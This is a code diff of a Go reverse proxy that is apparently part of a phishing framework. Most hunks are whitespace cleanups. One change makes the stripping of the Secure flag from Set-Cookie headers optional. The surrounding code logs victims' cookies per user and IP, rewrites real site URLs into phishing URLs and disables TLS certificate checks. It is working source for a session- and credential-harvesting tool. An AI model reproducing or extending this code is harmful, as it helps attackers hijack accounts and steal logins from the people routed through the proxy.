@@ -46,7 +46,7 @@ type ReverseProxy struct {
 	Proxy          *httputil.ReverseProxy // instance of Go ReverseProxy that will proxy requests/responses
 	Config         *config.Options
 	IsTLS          bool
-	RequestContext  *plugin.HTTPContext
+	RequestContext *plugin.HTTPContext
 }
 
 type ReverseProxyFactorySettings struct {
@@ -54,7 +54,7 @@ type ReverseProxyFactorySettings struct {
 	target         string
 	originaltarget string
 	origin         string
-	IsTLS 		   bool
+	IsTLS          bool
 }
 
 type HTTPResponse struct {
@@ -116,7 +116,6 @@ func (p *ReverseProxy) rewriteRequest(r *http.Request) (err error) {
 	p.RequestContext.Origin = p.Origin
 
 	p.RequestContext.InvokeHTTPRequestHooks(request.Request)
-
 
 	log.HTTPRequest(request.Request, p.RequestContext.UserID)
 
@@ -224,9 +223,12 @@ func (httpResponse *HTTPResponse) PatchHeaders(p *ReverseProxy) {
 		log.Cookies(p.RequestContext.UserID, p.Target.String(), httpResponse.Header["Set-Cookie"], p.IP)
 
 		for i, v := range httpResponse.Header["Set-Cookie"] {
-			//strip out the secure Flag
-			r := strings.NewReplacer("Secure", "", "secure", "")
-			cookie := r.Replace(v)
+			cookie := v
+			if runtime.AllowSecureCookies == false {
+				//strip out the secure Flag
+				r := strings.NewReplacer("Secure", "", "secure", "")
+				cookie = r.Replace(cookie)
+			}
 			cookie = runtime.RegexpFindSetCookie.ReplaceAllStringFunc(cookie, runtime.TranslateSetCookie)
 			log.Debugf("Rewriting Set-Cookie Flags: from \n[%s]\n --> \n[%s]\n", httpResponse.Header["Set-Cookie"][i], cookie)
 			httpResponse.Header["Set-Cookie"][i] = cookie
@@ -416,7 +418,6 @@ func (p *ReverseProxy) InjectPayloads(buffer []byte) []byte {
 
 func (p *ReverseProxy) PatchURL(buffer []byte) []byte {
 
-
 	// Translate URLs
 	buffer = []byte(runtime.RegexpUrl.ReplaceAllStringFunc(string(buffer), runtime.RealURLtoPhish))
 
@@ -425,7 +426,6 @@ func (p *ReverseProxy) PatchURL(buffer []byte) []byte {
 			buffer = bytes.Replace(buffer, []byte(key), []byte(value), -1)
 		}
 	}
-
 
 	if runtime.ForceHTTPS == true {
 		buffer = bytes.Replace(buffer, []byte("http://"), []byte("https://"), -1)
@@ -440,8 +440,6 @@ func (p *ReverseProxy) PatchURL(buffer []byte) []byte {
 			buffer = bytes.Replace(buffer, []byte(res), []byte(runtime.RealURLtoPhish(res)), -1)
 		}
 	}
-
-
 
 	return buffer
 }
@@ -458,18 +456,16 @@ func (s *ReverseProxyFactorySettings) NewReverseProxy() *ReverseProxy {
 		Config:         &s.Options,
 		IsTLS:          s.IsTLS,
 		OriginalTarget: s.originaltarget,
-		RequestContext:  &plugin.HTTPContext{
-			Extra:     make(map[string]string),
+		RequestContext: &plugin.HTTPContext{
+			Extra: make(map[string]string),
 		},
 	}
-
-
 
 	transport := &http.Transport{
 
 		TLSClientConfig: &tls.Config{
 			InsecureSkipVerify: true,
-			Renegotiation: tls.RenegotiateFreelyAsClient,
+			Renegotiation:      tls.RenegotiateFreelyAsClient,
 		},
 		DialContext: (&net.Dialer{
 			Timeout:   10 * time.Second,
@@ -503,7 +499,6 @@ func (s *ReverseProxyFactorySettings) NewReverseProxy() *ReverseProxy {
 	rp.Proxy.ErrorHandler = func(w http.ResponseWriter, r *http.Request, err error) {
 		log.Debugf("[Proxy error][Error: %s]", err.Error())
 	}
-
 
 	// Handling: Response
 	rp.Proxy.ModifyResponse = rp.rewriteResponse
